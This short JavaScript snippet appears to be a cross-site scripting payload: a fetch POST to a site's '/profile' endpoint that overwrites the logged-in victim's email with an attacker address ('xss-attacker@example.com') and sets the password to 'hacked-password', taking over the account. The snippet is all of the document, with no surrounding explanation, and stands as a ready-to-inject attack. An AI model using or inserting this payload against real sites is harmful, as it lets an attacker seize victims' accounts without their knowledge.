fetch('/profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'email=xss-attacker%40example.com&password=hacked-password'
});
